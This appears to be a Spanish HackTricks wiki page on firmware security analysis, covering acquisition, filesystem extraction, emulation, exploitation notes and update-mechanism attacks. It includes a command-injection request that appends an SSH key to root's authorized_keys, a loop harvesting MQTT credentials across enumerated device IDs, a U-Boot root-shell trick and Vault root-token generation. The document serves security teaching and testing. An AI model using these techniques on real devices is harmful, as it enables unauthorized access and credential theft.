# Análisis de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introducción**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es software esencial que permite que los dispositivos funcionen correctamente, gestionando y facilitando la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, dando lugar al inicio del sistema operativo. Examinar y modificar potencialmente el firmware es un paso crítico para identificar vulnerabilidades de seguridad.<sup>[[2]](#references)[[3]](#references)</sup>

## **Recopilación de información**

La **recopilación de información** es un paso inicial crítico para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Detalles del bootloader
- Diseño del hardware y hojas de datos
- Métricas del codebase y ubicaciones del código fuente
- Bibliotecas externas y tipos de licencia
- Historial de actualizaciones y certificaciones regulatorias
- Diagramas de arquitectura y de flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para este propósito, las herramientas de **open-source intelligence (OSINT)** son inestimables, al igual que el análisis de cualquier componente de software open source disponible mediante procesos de revisión manuales y automatizados. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede utilizarse para encontrar posibles problemas.

## **Adquisición del Firmware**

La obtención del firmware puede abordarse de varias maneras, cada una con su propio nivel de complejidad:

- **Directamente** desde la fuente (desarrolladores, fabricantes)
- **Compilándolo** a partir de las instrucciones proporcionadas
- **Descargándolo** desde sitios oficiales de soporte
- Utilizando consultas de **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **cloud storage**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **actualizaciones** mediante técnicas man-in-the-middle
- **Extrayéndolo** del dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
- **Sniffing** de solicitudes de actualización dentro de la comunicación del dispositivo
- Identificando y utilizando **endpoints de actualización hardcodeados**
- **Volcándolo** desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, cuando todo lo demás falla, utilizando las herramientas de hardware adecuadas

### Logs solo de UART: forzar un root shell mediante el entorno de U-Boot en la flash

Si se ignora UART RX (solo hay logs), todavía puedes forzar un init shell **editando offline el blob del entorno de U-Boot**:<sup>[[6]](#references)</sup>

1. Volcar la SPI flash con un clip SOIC-8 y un programador (3.3 V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localizar la partición del entorno de U-Boot, editar `bootargs` para incluir `init=/bin/sh` y **recalcular el CRC32 del entorno de U-Boot** para el blob.
3. Volver a grabar únicamente la partición del entorno y reiniciar; debería aparecer un shell en UART.

Esto resulta útil en dispositivos embedded cuyo shell del bootloader está deshabilitado, pero cuya partición de entorno se puede escribir mediante acceso externo a la flash.

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Hay diferentes herramientas que puedes utilizar para ello:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si la entropía es baja, no es probable que esté cifrada. Si la entropía es alta, probablemente esté cifrada (o comprimida de alguna manera).

Además, puedes utilizar estas herramientas para extraer **archivos incrustados dentro del firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Obtención del sistema de archivos

Con las herramientas mencionadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk normalmente lo extrae dentro de una **carpeta cuyo nombre corresponde al tipo de sistema de archivos**, que suele ser uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no tendrá el magic byte del sistema de archivos en sus firmas**. En estos casos, utiliza binwalk para **encontrar el offset del sistema de archivos y extraer el sistema de archivos comprimido** del binario, y **extrae manualmente** el sistema de archivos según su tipo siguiendo los pasos indicados a continuación.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Ejecuta el siguiente **comando dd** para realizar el carving del sistema de archivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, también se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (utilizado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Los archivos estarán posteriormente en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para filesystems jffs2

`$ jefferson rootfsfile.jffs2`

- Para filesystems ubifs con memoria flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Análisis del Firmware

Una vez obtenido el firmware, es esencial diseccionarlo para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar varias herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar los tipos de archivo, extraer strings, analizar datos binarios y comprender los detalles de las particiones y del filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere una falta de cifrado, mientras que una entropía alta indica un posible cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para la inspección de archivos.

### Extracción del sistema de archivos

Mediante `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio cuyo nombre corresponde al tipo de sistema de archivos (por ejemplo, squashfs, ubifs). Sin embargo, cuando **binwalk** no consigue reconocer el tipo de sistema de archivos debido a la ausencia de magic bytes, es necesario realizar una extracción manual. Esto implica usar `binwalk` para localizar el offset del sistema de archivos y, a continuación, el comando `dd` para extraerlo:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Después, dependiendo del tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se utilizan distintos comandos para extraer manualmente el contenido.

### Análisis del sistema de archivos

Con el sistema de archivos extraído, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales hardcodeadas, los endpoints de API, las funcionalidades del servidor de actualizaciones, el código no compilado, los scripts de inicio y los binarios compilados para su análisis offline.

Las **ubicaciones** y **elementos clave** que se deben inspeccionar incluyen:

- **etc/shadow** y **etc/passwd** para obtener credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts en busca de posibles vulnerabilidades
- Binarios integrados para realizar análisis adicionales
- Servidores web y binarios comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información sensible
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para realizar un análisis completo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para realizar análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse minuciosamente en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios sin protección que podrían explotarse.

## Obtención de la configuración de cloud y las credenciales MQTT mediante tokens de URL derivados

Muchos hubs IoT obtienen la configuración específica de cada dispositivo desde un endpoint de cloud con un formato similar al siguiente:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, es posible descubrir que `<token>` se deriva localmente del ID del dispositivo mediante un secreto hardcodeado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y se representa como hexadecimal en mayúsculas

Este diseño permite que cualquiera que conozca un deviceId y el STATIC_KEY reconstruya la URL y obtenga la configuración de cloud, que a menudo revela credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extraer deviceId de los logs de arranque de UART

- Conectar un adaptador UART de 3.3 V (TX/RX/GND) y capturar los logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Busca líneas que impriman el patrón de la URL de cloud config y la dirección del broker, por ejemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY y el algoritmo del token desde el firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Recopilar la configuración de cloud y las credenciales MQTT

- Componer la URL y obtener el JSON con curl; analizarlo con jq para extraer los secretos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Aprovechar MQTT en texto plano y ACLs débiles de topics (si están presentes)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivos predecibles (a escala y con autorización)

- Muchos ecosistemas incorporan bytes de OUI del proveedor/producto/tipo seguidos de un sufijo secuencial.
- Puedes iterar sobre IDs candidatos, derivar tokens y obtener configs mediante programación:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Obtén siempre autorización explícita antes de intentar realizar una enumeración masiva.
- Siempre que sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.


El proceso de emular firmware permite realizar **análisis dinámico**, ya sea de la operación de un dispositivo o de un programa individual. Este enfoque puede presentar dificultades relacionadas con las dependencias del hardware o de la arquitectura, pero transferir el sistema de archivos raíz o binarios específicos a un dispositivo con una arquitectura y un endianness compatibles, como una Raspberry Pi, o a una máquina virtual preconstruida, puede facilitar pruebas adicionales.

### Emulación de binarios individuales

Para examinar programas individuales, es crucial identificar el endianness y la arquitectura de CPU del programa.

#### Ejemplo con arquitectura MIPS

Para emular un binario con arquitectura MIPS, se puede usar el comando:
```bash
file ./squashfs-root/bin/busybox
```
Y para instalar las herramientas de emulación necesarias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), se utiliza `qemu-mips`, y para binarios little-endian, `qemu-mipsel` sería la opción adecuada.

#### Emulación de la arquitectura ARM

Para binarios ARM, el proceso es similar, utilizando el emulador `qemu-arm` para la emulación.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa del firmware, automatizando el proceso y ayudando en el análisis dinámico.

## Análisis dinámico en la práctica

En esta etapa, se utiliza para el análisis un entorno de dispositivo real o emulado. Es esencial mantener el acceso shell al sistema operativo y al sistema de archivos. Es posible que la emulación no reproduzca perfectamente las interacciones con el hardware, lo que puede requerir reinicios ocasionales de la emulación. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web y los servicios de red expuestos, y explorar las vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, utilizando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un debugger completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctate de forma remota:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapeo de mensajes Zigbee / radio-co-processor

En los hubs IoT, la pila RF suele estar dividida entre una **radio MCU** y un proceso de userland de Linux. Un flujo de trabajo útil consiste en mapear la ruta:<sup>[[8]](#references)</sup>

1. **RF frame** por el aire
2. **controller-side parser** en la radio MCU
3. **serial/UART text or TLV protocol** reenviado a Linux (por ejemplo `/dev/tty*`)
4. **application dispatcher** en el daemon principal
5. **protocol-specific handler / state machine**

Esta arquitectura crea dos objetivos de reversing en lugar de uno. Si el controller convierte los RF frames binarios en un protocolo textual como `Group,Command,arg1,arg2,...`, recupera:

- Los **message groups** y las tablas de dispatch
- Qué mensajes pueden proceder de la **network** frente a los generados por el propio controller
- Los campos exactos de discriminación **manufacturer-specific** (por ejemplo, Zigbee `manufacturer_code` y `cluster_command` personalizados)
- Qué handlers solo son alcanzables durante las fases de **commissioning**, discovery o descarga de firmware/modelo

Específicamente para Zigbee, captura el tráfico de pairing y comprueba si el objetivo todavía depende del **Link Key** predeterminado `ZigBeeAlliance09`. Si es así, sniffing del tráfico de commissioning puede revelar la **Network Key**. Los install codes de Zigbee 3.0 reducen esta exposición; por tanto, comprueba si el dispositivo probado realmente los aplica.

### Protocol handlers manufacturer-specific y reachability controlada por FSM

Los comandos Zigbee/ZCL específicos del vendor suelen ser un objetivo mejor que los clusters estandarizados, porque alimentan **custom parsing code** y **FSMs** internas con una validación menos probada.<sup>[[8]](#references)</sup>

Flujo de trabajo práctico:

- Haz reversing del command dispatcher hasta encontrar el **vendor-only handler**.
- Recupera las tablas de **FSM state**, **event**, **check**, **action** y **next-state**.
- Identifica los **transitional states** que avanzan automáticamente y las ramas de retry/error que finalmente resetean o liberan el estado controlado por el atacante.
- Confirma qué intercambios legítimos del protocolo son necesarios para colocar el daemon en el estado vulnerable, en lugar de asumir que el handler vulnerable siempre es alcanzable.

Para protocolos sensibles al timing, el packet replay desde un framework de Python puede ser demasiado lento. Un enfoque más fiable consiste en emular un dispositivo legítimo en hardware real (por ejemplo, un **nRF52840**) con un stack de nivel vendor, para poder exponer los **endpoints**, **attributes** y el timing correcto de commissioning.

### Clase de bug de descarga fragmentada en daemons embebidos

Una clase recurrente de bugs de firmware aparece en las descargas fragmentadas de **blobs/modelos/configuraciones**:<sup>[[8]](#references)</sup>

1. El **primer fragment** (`offset == 0`) almacena `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragments posteriores solo validan campos controlados por el atacante y locales al **packet**, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar el tamaño asignado originalmente.

Esto permite a un atacante enviar:

- Un primer fragment válido con un **total size** declarado pequeño para forzar una asignación de heap pequeña.
- Un fragment posterior con el **offset esperado**, pero con un `chunk_len` mayor.
- Un tamaño local del packet falsificado que satisfaga las comprobaciones recientes y, aun así, desborde el buffer asignado originalmente.

Cuando la ruta vulnerable está detrás de lógica de commissioning, el exploitation debe incluir suficiente **device emulation** para llevar el objetivo al estado esperado de descarga de modelo o blob antes de enviar los fragments malformados.

### Triggers de `free()` controlados por el protocolo

En los daemons embebidos, la forma más sencilla de activar la explotación de heap metadata a menudo no consiste en «esperar a la limpieza», sino en **forzar el propio error handling del protocolo**:<sup>[[8]](#references)</sup>

- Envía fragments de seguimiento malformados para llevar la FSM a estados de **retry** o **error**.
- Supera el umbral de reintentos para que el daemon **resetee el contexto** y libere el buffer corrupto.
- Usa este `free()` predecible para activar primitives del allocator antes de que el proceso se bloquee por motivos no relacionados.

Esto resulta especialmente útil contra allocators de tipo **musl/uClibc/dlmalloc** en Linux embebido, donde corromper chunk metadata puede convertir la lógica de unlink/unbin en una write primitive. Un patrón estable consiste en corromper un **size field** para redirigir el recorrido del allocator hacia **fake chunks** preparados dentro del buffer desbordado, en lugar de sobrescribir inmediatamente punteros reales de los bins y bloquear el proceso.

## Binary Exploitation y Proof-of-Concept

Desarrollar un PoC para las vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura del objetivo y programación en lenguajes de bajo nivel. Las protecciones del runtime binario son poco frecuentes en sistemas embebidos, pero, cuando están presentes, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

### Notas sobre la explotación de fastbins de uClibc (Linux embebido)

- **Fastbins + consolidation:** uClibc utiliza fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, por lo que cualquier fake chunk debe superar las comprobaciones (tamaño válido, `fd = 0` y chunks circundantes considerados «en uso»).<sup>[[6]](#references)</sup>
- **Binaries non-PIE bajo ASLR:** si ASLR está habilitado pero el binario principal es **non-PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a una cabecera válida de heap chunk para conseguir una asignación de fastbin sobre una **function pointer table**.
- **NUL que detiene el parser:** cuando se analiza JSON, un `\x00` en el payload puede detener el parsing y conservar bytes posteriores controlados por el atacante para un stack pivot/ROP chain.
- **Shellcode mediante `/proc/self/mem`:** una ROP chain que llame a `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapping conocido y saltar hacia él.

## Sistemas operativos preparados para Firmware Analysis

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para security testing de firmware, equipados con las herramientas necesarias.

## OSs preparados para analizar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro destinada a ayudarte a realizar security assessment y penetration testing de dispositivos del Internet of Things (IoT). Ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias ya cargadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo de embedded security testing basado en Ubuntu 18.04 y precargado con herramientas de firmware security testing.

## Ataques de Firmware Downgrade y mecanismos de actualización inseguros

Incluso cuando un vendor implementa comprobaciones de firmas criptográficas para las imágenes de firmware, la **protección contra version rollback (downgrade)** se omite con frecuencia. Cuando el boot- o recovery-loader solo verifica la firma con una clave pública integrada, pero no compara la *versión* (o un contador monotónico) de la imagen que se está flasheando, un atacante puede instalar legítimamente un **firmware antiguo y vulnerable que aún conserva una firma válida** y reintroducir así vulnerabilidades corregidas.<sup>[[4]](#references)</sup>

Flujo de ataque típico:

1. **Obtén una imagen antigua firmada**
* Descárgala del portal público de descargas, CDN o sitio de soporte del vendor.
* Extráela de aplicaciones móviles/de escritorio complementarias (por ejemplo, dentro de un Android APK en `assets/firmware/`).
* Recupérala de repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Sube o sirve la imagen al dispositivo** mediante cualquier canal de actualización expuesto:
* Web UI, API de mobile app, USB, TFTP, MQTT, etc.
* Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *no autenticados* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor y activan la recuperación/actualización.
3. Después del downgrade, explota una vulnerabilidad corregida en la versión más reciente (por ejemplo, un filtro de command injection añadido posteriormente).
4. Opcionalmente, vuelve a flashear la imagen más reciente o desactiva las actualizaciones para evitar la detección una vez obtenida la persistencia.

### Ejemplo: Command Injection después de un Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un shell command sin sanitización, lo que permite la inyección de comandos arbitrarios (en este caso, habilitando el acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de downgrade protection hace que la corrección sea ineficaz.<sup>[[4]](#references)</sup>

### Extracción de Firmware de Aplicaciones Móviles

Muchos vendors incluyen imágenes completas de firmware en sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo mediante Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX, en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso `unzip` permiten extraer imágenes firmadas sin interactuar con el hardware físico.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass de anti-rollback solo en el updater en diseños de slots A/B

Algunos vendors implementan un **ratchet** anti-downgrade, pero únicamente dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recuperación o un agente OTA en userspace). Si el **bootloader** posteriormente solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o en los metadatos del slot, la protección contra rollback aún puede evadirse.<sup>[[7]](#references)</sup>

Diseño débil típico:

- Los metadatos del firmware contienen tanto un descriptor de versión como un **security ratchet** / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en persistent storage y rechaza imágenes firmadas antiguas.
- El **bootloader** no analiza ese ratchet y solo verifica el header, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado en una tabla de particiones o en un contador de generación por slot, y **no está vinculada criptográficamente** al digest exacto del firmware validado.

Esto crea una primitiva de **validate-one-image / boot-another-image** en sistemas de dos slots. Si el atacante puede hacer que el updater marque el slot B como próximo objetivo de arranque usando una imagen firmada actual, y posteriormente sobrescribir el slot B antes del reinicio, el bootloader podría arrancar la imagen downgraded porque solo confía en los metadatos del slot ya confirmados.

Patrón de abuso común:

1. Cargar un firmware **current signed** en el slot pasivo y ejecutar la rutina normal de validación/cambio para que el layout marque ese slot como próximo activo.
2. **No reiniciar todavía**. Volver a entrar en la rutina de preparación/borrado del slot durante la misma sesión.
3. Aprovechar una lógica obsoleta del estado de arranque o de selección del slot para que el updater borre el **mismo slot físico** que acababa de promover.
4. Escribir un firmware **older but still signed** en ese slot.
5. Omitir la rutina de validación que aplica el ratchet y reiniciar directamente.
6. El bootloader selecciona el slot promovido, verifica únicamente la firma/integridad y arranca la imagen antigua.

Aspectos que se deben buscar al hacer reversing de implementaciones de actualización A/B:

- Selección del slot derivada de **boot-time flags** que no se actualizan después de un cambio exitoso.
- Una rutina similar a `prepare_passive_slot()` que borra un slot basándose en un estado obsoleto en lugar del **layout confirmado actual**.
- Una función similar a `part_write_layout()` que únicamente incrementa un **generation counter** / active flag y no almacena el hash de la imagen validada.
- Comprobaciones del ratchet implementadas en userspace o en el código del updater, pero **no** en las fases de ROM / bootloader / secure boot.
- Rutinas de borrado o recuperación que dejan el slot marcado como arrancable incluso después de eliminar y volver a escribir su contenido.

### Checklist para evaluar la lógica de actualización

* ¿El transporte/autenticación del *update endpoint* está adecuadamente protegido (TLS + autenticación)?
* ¿El dispositivo compara **números de versión** o un **contador monotónico anti-rollback** antes de flashear?
* ¿La imagen se verifica dentro de una secure boot chain (por ejemplo, mediante firmas comprobadas por el código ROM)?
* ¿El **bootloader aplica el mismo ratchet** que el updater, en lugar de comprobar únicamente la firma/CRC?
* ¿Los metadatos de activación del slot están **vinculados al digest/versión del firmware validado**, o el slot puede modificarse después de su promoción?
* Después de un cambio de slot exitoso, ¿el dispositivo está obligado a reiniciarse o las rutinas posteriores de actualización/borrado siguen siendo accesibles durante la misma sesión?
* ¿El código de userland realiza comprobaciones de coherencia adicionales (por ejemplo, mapa de particiones permitido, número de modelo)?
* ¿Los flujos de actualización *partial* o *backup* reutilizan la misma lógica de validación?

> 💡  Si falta cualquiera de los elementos anteriores, probablemente la plataforma sea vulnerable a ataques de rollback.

## Firmware vulnerable para practicar

Para practicar el descubrimiento de vulnerabilidades en firmware, utiliza los siguientes proyectos de firmware vulnerable como punto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperación de claves de descifrado del firmware desde el estado de KMS/Vault embebido

Cuando una imagen de actualización mezcla pequeños metadatos en texto plano con un blob grande de alta entropía, realiza primero un análisis del contenedor antes de intentar cualquier brute-force:<sup>[[1]](#references)</sup>

- Extrae headers, offsets y límites de línea con `hexdump`, `xxd`, `strings -tx`, `base64 -d` y `binwalk -E`.
- `Salted__` normalmente indica el formato `enc` de OpenSSL: los siguientes 8 bytes son el salt y los bytes restantes son el ciphertext.
- Un campo Base64 que decodifica exactamente a `256` bytes es un indicio sólido de que estás ante un ciphertext RSA-2048 que envuelve una contraseña/clave de sesión de firmware aleatoria.
- El material PGP detached en el mismo archivo suele proteger únicamente la autenticidad; no asumas que es el mecanismo de confidencialidad.

Si la búsqueda de claves estáticas (`grep`, `strings`, búsquedas de PEM/PGP) falla, haz reversing de la **ruta operativa de descifrado** en lugar de limitarte a buscar private keys:

- Decompila el binario del updater / management y rastrea quién lee el blob cifrado, qué helper/API lo desenvuelve y el nombre lógico de clave que solicita.
- Busca en el root filesystem extraído el estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), además de los unit files y scripts de init.
- Trata el texto plano `vault operator unseal ...`, las recovery keys, los bootstrap tokens o los scripts locales de auto-unseal de KMS como equivalentes al material de private keys.

Si el appliance incluye el binario original de Vault y el backend de almacenamiento, normalmente es más fácil reproducir ese entorno que reimplementar los internals de Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Con root en el KMS clonado:

- Haz que las transit keys sean exportables únicamente dentro del clon aislado: `vault write transit/keys/<name>/config exportable=true`
- Exporta la unwrap key: `vault read transit/export/encryption-key/<name>`
- Prueba la clave RSA recuperada con el par exacto de padding/hash utilizado por el KMS. Un descifrado fallido con PKCS#1 v1.5 y un descifrado OAEP predeterminado fallido **no** demuestran que la clave sea incorrecta; muchos flujos respaldados por Vault utilizan OAEP con SHA-256, mientras que las bibliotecas comunes utilizan SHA-1 de forma predeterminada.
